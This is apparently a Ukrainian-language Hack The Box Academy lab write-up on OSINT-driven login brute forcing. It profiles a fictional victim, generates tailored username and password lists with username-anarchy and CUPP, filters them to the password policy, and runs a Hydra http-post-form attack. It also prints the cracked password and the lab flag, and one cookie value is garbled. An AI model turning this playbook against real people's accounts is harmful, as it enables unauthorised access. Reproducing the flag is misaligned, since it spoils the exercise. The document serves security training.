# Custom Wordlist Attack (CUPP + username-anarchy + Hydra)

## Модуль
[Login Brute Forcing — Custom Wordlists](https://academy.hackthebox.com/app/module/57/section/3209)

## Концепція

**OSINT-driven brute force** — збираємо інфо про жертву з соцмереж,
генеруємо персоналізований wordlist через CUPP і список юзернеймів через
username-anarchy. Значно ефективніше за generic wordlists.

## OSINT профіль (Jane Smith)

| Field | Value |
|-------|-------|
| Name | Jane Smith |
| Nickname | Janey |
| Birthdate | 11/12/1990 |
| Partner | Jim (Jimbo), born 12/12/1990 |
| Pet | Spot |
| Company | AHI |
| Interests | Hackers, Pizza, Golf, Horses |

## Повний плейбук

### Крок 1 — Встановлення username-anarchy

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > ~/jane_smith_usernames.txt
cd ~
```

### Крок 2 — CUPP: генерація password wordlist

```bash
sudo apt install cupp -y
cupp -i
# Заповнити інтерактивну форму даними з OSINT профілю:
# First Name: Jane | Surname: Smith | Nickname: Janey
# Birthdate: 11121990 | Partner: Jim | Partner nick: Jimbo
# Partner BD: 12121990 | Pet: Spot | Company: AHI
# Keywords: Hackers,Pizza,Golf,Horses
# Special chars: y | Random numbers: y | Leet mode: y
# → генерує jane.txt
```

### Крок 3 — Фільтр за password policy

```bash
grep -E '^.{6,}$' jane.txt \
  | grep -E '[A-Z]' \
  | grep -E '[a-z]' \
  | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

wc -l jane-filtered.txt
# → 8213 паролів після фільтрації
```

### Крок 4 — Hydra: cluster bomb attack

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt \
  TARGET_IP -s TARGET_PORT -f \
  http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 64
```
FOUND: login: jane password: 3n4J!!

### Крок 5 — Отримати флаг (cookie workflow)

```bash
# POST логін → витягти Set-Cookie
curl -v -X POST 'http://TARGET_IP:PORT/' \
  -d 'username=jane&password=3n4J!!' 2>&1 \
  | grep -i "Set-Cookie"
# → session=eyJsb2dnZWRfaW4iOnRydWV9...

# GET /success з cookie
curl -s 'http://TARGET_IP:PORT/success' \
  -b 'session=okie_value>'
```

**Flag:** `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`

---

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | `cupp -i` — інтерактивний режим, вводити всі OSINT дані |
| 2 | Фільтр grep — обов'язковий, бо CUPP генерує мільйони паролів |
| 3 | `-f` у Hydra — зупинитись після першого SUCCESS |
| 4 | Cookie може не зберегтись через `-c` якщо redirect — витягувати вручну з `-v` |
| 5 | username-anarchy генерує 14 варіантів з "Jane Smith" |

## Cookie workflow (якщо -c не спрацьовує)

```bash
# Варіант 1: -v + grep Set-Cookie → скопіювати вручну
curl -v -X POST URL -d "creds" 2>&1 | grep "Set-Cookie"

# Варіант 2: -D - (dump headers)
curl -s -X POST URL -d "creds" -D - | grep "Set-Cookie"
```

## grep policy фільтри (шпаргалка)

| Вимога | grep pattern |
|--------|-------------|
| Мін. 6 символів | `grep -E '^.{6,}$'` |
| Є велика літера | `grep -E '[A-Z]'` |
| Є мала літера | `grep -E '[a-z]'` |
| Є цифра | `grep -E '[0-9]'` |
| 2+ спецсимволи | `grep -E '([!@#$%^&*].*){2,}'` |
| Виключити слово | `grep -v -i 'password'` |
